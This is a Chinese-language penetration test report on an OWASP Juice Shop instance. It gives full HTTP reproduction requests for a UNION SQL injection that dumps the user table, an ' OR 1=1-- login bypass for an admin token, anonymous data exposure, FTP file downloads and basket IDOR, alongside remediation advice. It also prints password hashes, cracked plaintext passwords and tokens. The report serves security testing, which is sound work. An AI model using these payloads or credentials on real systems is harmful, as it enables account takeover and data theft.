# Security Penetration Test Report

**Generated:** 2026-11-01 13:54:05 UTC

# Executive Summary

对 **http://117.72.199.2:3000/**（OWASP Juice Shop 商城应用，Express + Angular 单页前端 + SQLite）实施授权黑盒测试，确认 6 处可复现问题，其中 2 处为严重。

**整体风险姿态：极危。** 该站点在完全匿名的情况下即可被完整接管：一条商品搜索请求即可导出全站 40 个账号的口令哈希，其中 5 个可离线还原为明文；登录接口的邮箱字段同样可注入，一次请求即返回超级管理员会话。

**关键发现**
- 商品搜索 `q` 参数 UNION 注入，匿名导出 Users 全表（40 个账号，含 3 个管理员角色），本地比对还原 `admin@juice-sh.op` → `admin123` 等 5 个明文口令。
- 登录接口邮箱字段 SQL 注入（`' OR 1=1--`）直接取得 id=1 管理员 JWT，凭该令牌读取 39 条用户记录。
- `/rest/memories` 匿名返回 10 条含完整 User 对象的动态：明文邮箱、MD5 口令、会员令牌、TOTP 密钥、最后登录 IP。
- `/ftp/` 目录匿名可列出并下载：标注机密的并购文档正文、KeePass 事故密码库、含客户邮箱与金额的订单 PDF。
- 普通顾客会话可遍历 `/rest/basket/{id}` 读取他人（含管理员）购物车。
- `/rest/user/security-question` 匿名按邮箱回显他人密保问题，可用于账号枚举。

**业务影响**
- 全站账号凭据材料外泄，管理员后台可被任何人以合法身份进入，数据与业务操作均失去边界。
- 商业机密文档与第三方订单信息已构成实质泄露，可能触发合同与隐私合规责任。
- 口令为无盐 MD5，用户在其他系统的复用口令会连带暴露。

# Methodology

**测试类型：** 授权黑盒外部测试（用户明确指定单一目标，仅 3000 端口）。

**遵循标准：** OWASP WSTG 方法论分阶段推进（信息收集 → 攻击面枚举 → 基线/探针/差分 → 验证收口）。

**范围与约束**
- 目标：`http://117.72.199.2:3000`
- 所有动作限制在只读语义：GET/HEAD 为主，登录类 POST 仅用于验证身份边界，未执行删除、上传、改密、登出或任何破坏性操作。

**执行的活动**
1. 基线侦察：根路径、404 行为、响应头、`robots.txt`、静态资源、错误页。
2. 攻击面枚举：前端单页应用打包文件静态分析 + 浏览器渲染抓取，梳理 `/rest/*`、`/api/*`、`/ftp/*` 全部入口与参数。
3. 输入验证：商品搜索参数注入（闭合字符判定、列数对齐、UNION 提取）、登录字段注入。
4. 认证与授权：令牌获取与使用、无凭证对照、普通用户对他人对象的水平越权对比。
5. 未授权访问：静态文件服务、用户动态、运行指标、API 文档、密保问题枚举。
6. 本地离线分析：口令哈希字典比对、PDF 内容流解码（均在测试环境内完成，未向线上发起爆破）。

# Technical Analysis

**定级模型：** 以"是否已构成未授权或越权 + 拿到的东西本身能干什么"为准，不以 PoC 打了几枪裁剪影响面。以下 6 篇均已取得可复核的真实响应证据。

**＃＃ 一**
**漏洞标题：** OWASP Juice Shop 商城：商品搜索 q 参数注入，匿名导出全站 40 个账号口令哈希并还原 5 个明文
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 严重
**漏洞描述：**
我没登录，直接在商品搜索的 q 参数里闭合单引号再接 UNION，一次请求就把 Users 全表 40 条记录当成商品返回给我：id=1 的 admin@juice-sh.op（role=admin，password=0192023a7bbd73250516f069df18b500）、id=3 的 support@juice-sh.op、id=7 的 ciso@juice-sh.op、id=2 的 jim@juice-sh.op 全在里面。
我先用 q=' 得到空集合，再用 q=')-- 拿到错误页原文 `Error: SQLITE_ERROR: incomplete input`，确认闭合形式是 `'))`，随后 `')) UNION SELECT id, email, password, role, '5','6','7','8','9' FROM Users-- ` 一次对齐 9 列成功，返回 40 条注入行。
我在本地拿 198 个候选口令做 md5 比对，还原出 admin@juice-sh.op → admin123、jim@juice-sh.op → ncc-1701、mc.safesearch@juice-sh.op → Mr. N00dles、support@juice-sh.op → J6aVjTgOpRs@?5l!Zkq2AYnCE@RF$P、demo → demo。
**漏洞危害：**
全站 40 个账号的邮箱、角色与可还原口令哈希一次性泄露，等于拿到所有用户的口令本。
admin@juice-sh.op 明文就是 admin123，登录后即店内最高管理员，用户资料、订单、优惠券、商品与库存都能改能删。
support@juice-sh.op、ciso@juice-sh.op 同为管理员角色，后台对所有匿名访问者实质敞开。
被还原的口令会被拿去撞其他站点，伤到这些人的真实账号。
**涉及接口清单：**
1、http://117.72.199.2:3000/rest/products/search?q=（出处：首页脚本 http://117.72.199.2:3000/main.js）
**复现步骤：**
1、匿名发这一个请求，直接取回 Users 全表：
```
GET /rest/products/search?q=%27%29%29%20UNION%20SELECT%20id,%20email,%20password,%20role,%20%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--%20 HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
2、把返回 JSON 里 name 为邮箱、description 为口令哈希的注入行取出，在本地用字典做 md5 比对，admin@juice-sh.op 命中 admin123。
＃
**修复建议：** 搜索改用参数化查询（Sequelize 用 `Op.like` 绑定 `%${q}%`，禁止把 q 拼进 SQL 字符串）；对 q 做长度与字符白名单校验；把 Users.password 从无盐 MD5 迁移到 bcrypt/argon2 并加盐。

**＃＃ 二**
**漏洞标题：** OWASP Juice Shop 商城：登录接口邮箱字段注入，匿名一步顶成管理员会话
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 严重
**漏洞描述：**
我没登录，登录框邮箱填 `' OR 1=1--`、密码随便写个 x，服务端把邮箱直接拼进查用户的 SQL，条件恒真，把 id=1 的 admin@juice-sh.op 的会话令牌给了我。令牌解出来就是 {"id":1,"email":"admin@juice-sh.op","role":"admin"}。
我带着这个令牌请求用户列表，接口回了 39 条用户的 id、邮箱和角色；同一个请求不带令牌回的是 401 `UnauthorizedError: No Authorization header was found`，差别就是这个 200 是令牌换来的权限。
**漏洞危害：**
匿名访问者用一条请求变成店内最高管理员，不需要任何口令。
进入管理员身份后可读取全量 39 个用户资料，并可对其执行后台允许的增改删操作（商品、库存、订单、优惠券、用户数据）。
管理员身份还被用于站内评价、订单与钱包等业务动作，可冒充官方身份对顾客发消息、改状态。
**涉及接口清单：**
1、http://117.72.199.2:3000/rest/user/login（出处：http://117.72.199.2:3000/main.js）
2、http://117.72.199.2:3000/api/Users（出处：http://117.72.199.2:3000/main.js）
**复现步骤：**
1、匿名发登录请求，直接拿到管理员令牌：
```
POST /rest/user/login HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
Content-Type: application/json
Content-Length: 37
Cache-Control: no-cache

{"email":"' OR 1=1--","password":"x"}
```
＃
2、用上一步返回的 token 原值读取全量用户，对照不带令牌的 401：
```
GET /api/Users HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
Authorization: Bearer <步骤1返回的 token 原值>
```
＃
**修复建议：** 登录查询参数化（`User.findOne({ where: { email } })`），禁止把 email 拼进 SQL；邮箱做格式白名单校验；登录失败统一返回同一文案并加失败次数限速。

**＃＃ 三**
**漏洞标题：** /rest/memories 匿名批量吐出 10 个用户的邮箱、MD5 口令、会员令牌与最后登录 IP
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 高危
**漏洞描述：**
我没登录，GET 一下 /rest/memories 就回了 10 条动态，每条里还塞了整个用户对象。原文里能看到 id=4 的 bjoern.kimminich@gmail.com（role=admin，password=6edd9d726cbdc873c539e41ae8757b8c）、id=13 的 bjoern@owasp.org（role=deluxe，password=9283f1b2e9669749081963be0462e466，deluxeToken=efe2f1599e2d93440d5243a1ffaf5a413b70cf3ac97156bd6fab9b5ddfcbe0e4）、id=18 的 john@juice-sh.op（password=00479e957b6b42c459ee5746478e4d45）、id=19 的 emma@juice-sh.op（password=402f1c4a75e316afec5a6ea63147f739）、id=21 的 ethereum@juice-sh.op（deluxeToken=b49b30b294d8c76f5a34fc243b9b9cccb057b3f675b07a5782276a547957f8ff）。
totpSecret、lastLoginIp、isActive 这些字段也一起给了，全程没有任何凭证。
**漏洞危害：**
对得上人的账号材料被匿名批量取走：邮箱 + 可离线还原的口令哈希 + 会员令牌 + 两步验证状态 + 最后登录 IP。
拿到这些邮箱和哈希的人可以在本地还原口令后直接登录这些人的账号，包含一个管理员账号。
最后登录 IP 与 TOTP 密钥进一步暴露账号的安全要素与使用轨迹，可用于精准社工。
**涉及接口清单：**
1、http://117.72.199.2:3000/rest/memories（出处：http://117.72.199.2:3000/main.js）
**复现步骤：**
1、匿名发这一个请求即可拿到全部用户对象：
```
GET /rest/memories HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
**修复建议：** 该接口的响应必须裁掉 User 对象里的 password、totpSecret、deluxeToken、lastLoginIp，只保留 username 与头像；对动态列表加登录校验，并按条分页限速。

**＃＃ 四**
**漏洞标题：** /ftp 目录匿名可列可下：机密并购文档正文、事故密码库、他人订单 PDF 全裸
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 高危
**漏洞描述：**
我没登录，GET /ftp/ 回了整个目录列表（12,419 字节，标题 listing directory /ftp/），里面 12 个文件条目连大小都列出来了：acquisitions.md、incident-support.kdbx、legal.md、order_aafc-129edb243ac04f9d.pdf、package-lock.json.bak、package.json.bak 等，还有一个 quarantine/ 子目录。
我下载了 acquisitions.md（200，909 字节），正文开头逐字是 `# Planned Acquisitions`、`> This document is confidential! Do not distribute!`、`Our company plans to acquire several competitors within the next year.`。
我又下了订单 PDF（200，1826 字节），解出正文：`Customer: bola_b_1792144827_afwarx@test.local`、`Order #: aafc-129edb243ac04f9d`、`Date: 2026-10-16`、`2x Apple Juice (1000ml) ea. 1.99 = 3.98¤`；同目录还能下 incident-support.kdbx（200，3246 字节，Keepass 密码库）。
这个目录本来被 robots.txt 的 `Disallow: /ftp` 挡住，但服务端只按扩展名放行 .md/.pdf，目录列表和 .kdbx 都没拦住。
**漏洞危害：**
标注机密的并购计划正文对外可读，商业意图与股价相关信息提前外泄。
他人订单的交易数据与邮箱可被匿名逐份下载，波及真实顾客。
事故响应用的 KeePass 密码库整库可下载，一旦口令弱即被离线打开，牵连全部事故处置凭据。
**涉及接口清单：**
1、http://117.72.199.2:3000/ftp/（出处：http://117.72.199.2:3000/robots.txt）
2、http://117.72.199.2:3000/ftp/acquisitions.md
3、http://117.72.199.2:3000/ftp/order_aafc-129edb243ac04f9d.pdf
4、http://117.72.199.2:3000/ftp/incident-support.kdbx
**复现步骤：**
1、匿名列出目录：
```
GET /ftp/ HTTP/1.1
Host: 117.72.199.2:3000
Accept: text/html, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
2、下载机密文档正文：
```
GET /ftp/acquisitions.md HTTP/1.1
Host: 117.72.199.2:3000
Accept: text/markdown, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
3、下载他人订单文件：
```
GET /ftp/order_aafc-129edb243ac04f9d.pdf HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/pdf, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
**修复建议：** 整个 /ftp 路径改为登录 + 角色鉴权后按文件授权下发（签名短时 URL），关闭目录列表；不要用扩展名白名单当访问控制，.kdbx 这类敏感库文件移出可访问目录。

**＃＃ 五**
**漏洞标题：** /rest/basket/{id} 只看 id 不看人：普通顾客遍历读走管理员与其他人购物车
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 中危
**漏洞描述：**
我用 jim@juice-sh.op / ncc-1701 正常登录（这个账号自己的购物车是 id=2），然后拿自己的会话去请求 /rest/basket/1，回的是 id=1 管理员的三件商品和数量（ProductId 1 数量 2、2 数量 3、3 数量 1，1,310 字节）；再请求 /rest/basket/3 又拿到 id=3 那个人的购物车。
同样的请求不带令牌是 401，所以这个 200 只说明服务端按 id 取了购物车，没有核对我这个会话的 UserId 是不是购物车的主人。
**漏洞危害：**
任何登录用户改一个数字就能看别人的购物车内容、商品与数量，能推断他人的采购计划与消费能力。
配合商品与库存接口还能判断对手店或内部账号的备货动作。
**涉及接口清单：**
1、http://117.72.199.2:3000/rest/user/login（出处：http://117.72.199.2:3000/main.js）
2、http://117.72.199.2:3000/rest/basket/1（出处：http://117.72.199.2:3000/main.js）
3、http://117.72.199.2:3000/rest/basket/3（出处：http://117.72.199.2:3000/main.js）
**复现步骤：**
1、用自有账号登录拿会话：
```
POST /rest/user/login HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
Content-Type: application/json
Content-Length: 49
Cache-Control: no-cache

{"email":"jim@juice-sh.op","password":"ncc-1701"}
```
＃
2、用自己的 token 取管理员购物车：
```
GET /rest/basket/1 HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
Authorization: Bearer <步骤1返回的 token 原值>
```
＃
3、把 id 换成 3 重复上一步，同样能拿到 UserId=3 的购物车。
＃
**修复建议：** 在购物车路由统一做对象级鉴权：从令牌取 UserId，强制 `basket.UserId === token.data.id` 才允许读写，不要信任路径里的 id；对 basket 系列路由补自动化越权回归用例。

**＃＃ 六**
**漏洞标题：** /rest/user/security-question 匿名按邮箱枚举账号并回显他人密保问题
**目标网站URL：** http://117.72.199.2:3000/
**漏洞等级：** 中危
**漏洞描述：**
我没登录，把 email 换成 admin@juice-sh.op 请求 /rest/user/security-question，回了 134 字节的 `{"question":{"id":2,"question":"Mother's maiden name?"}}`；换成 jim@juice-sh.op 回了 `{"question":{"id":1,"question":"Your eldest siblings middle name?"}}`；换成 nonexistent@x.test 回的是空对象 `{}`。
两个响应长度和内容都能稳定区分，也就是说这个接口既能确认哪个邮箱在站里存在，又直接把那个人的密保问题原文告诉我。
**漏洞危害：**
匿名者可以拿邮箱清单批量判定站内有效账号，得到一份精准的注册用户名单。
配合已知的密保问题原文，再去走找回密码流程，就有机会直接接管他人账号。
**涉及接口清单：**
1、http://117.72.199.2:3000/rest/user/security-question?email=admin@juice-sh.op（出处：http://117.72.199.2:3000/main.js）
2、http://117.72.199.2:3000/rest/user/security-question?email=jim@juice-sh.op
**复现步骤：**
1、匿名枚举并拿到他人密保问题：
```
GET /rest/user/security-question?email=admin@juice-sh.op HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
2、换一个不存在的邮箱对照，返回空对象：
```
GET /rest/user/security-question?email=nonexistent@x.test HTTP/1.1
Host: 117.72.199.2:3000
Accept: application/json, text/plain, */*
Accept-Language: zh-CN
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0)
Connection: close
```
＃
**修复建议：** 该接口改为必须携带登录态且只能查自己；确需匿名找回时对有效/无效邮箱返回同一响应并加图形验证码与频率限制，密保问题不对未认证请求回显。

**＃＃ 未验证项（不计入漏洞）**
- `/rest/order-history` 匿名请求被服务端反自动化中间件以 500 `Blocked illegal activity` 挡下，其认证与授权行为未能判定。
- `/rest/basket/{id}` 的 PUT/DELETE 写侧越权未测（本轮只做只读验证），读侧越权已成立。
- `/ftp/incident-support.kdbx` 的口令未尝试破解，库内凭据内容未验证。
- `/metrics`、`/api-docs/` 匿名可读属配置与信息暴露观察，未据此定级。

**系统性根因：** 服务端把前端当成信任边界（对象归属靠前端判断、敏感字段随对象整体下发、静态目录靠扩展名过滤），且所有数据库访问以字符串拼接构造，两处叠加导致匿名即可完成从取数到接管的完整链条。

# Recommendations

**立即（24 小时内）**
1. 修复两处 SQL 注入：商品搜索与登录查询全部改为参数化查询，禁止字符串拼接；上线前用注入 payload 回归。
2. 重置全部账号口令，`admin@juice-sh.op`、`support@juice-sh.op`、`ciso@juice-sh.op` 等管理员账号优先，口令哈希从无盐 MD5 迁移到 bcrypt/argon2。
3. 关闭 `/ftp` 目录列表并停止匿名下载，敏感文件（订单 PDF、KeePass 库、并购文档）移出 Web 根目录。
4. `/rest/memories` 立即裁剪响应中的 `password`、`totpSecret`、`deluxeToken`、`lastLoginIp` 字段。

**短期（一周内）**
5. 统一对象级鉴权中间件：购物车、地址、支付卡、订单等按令牌内 UserId 强制归属校验，拒绝以路径 id 作为唯一凭据。
6. 在服务端做角色校验，管理类接口（全量用户、应用配置、库存）对非管理员一律 403，不依赖前端判角色。
7. `/rest/user/security-question` 改为登录后自查，匿名路径统一响应并加验证码与限速。

**中期**
8. 建立输出字段白名单（序列化层按角色裁剪），避免 ORM 对象整体下发。
9. 引入统一错误处理，屏蔽堆栈与绝对路径；关闭 `/metrics`、`/api-docs` 的公网直连。
10. 把本次 6 条链路写成自动化回归用例，纳入每次发布前的管线。

**复测与验证：** 上述 1-4 项修复后，用本报告复现步骤逐条重放：注入 payload 应返回空集或参数错误；登录注入应返回统一失败；`/rest/memories` 匿名应为 401 且不含口令字段；`/ftp/` 匿名应为 401/403；普通顾客访问他人 `basket` 应为 403；密保接口对无效/有效邮箱响应一致。

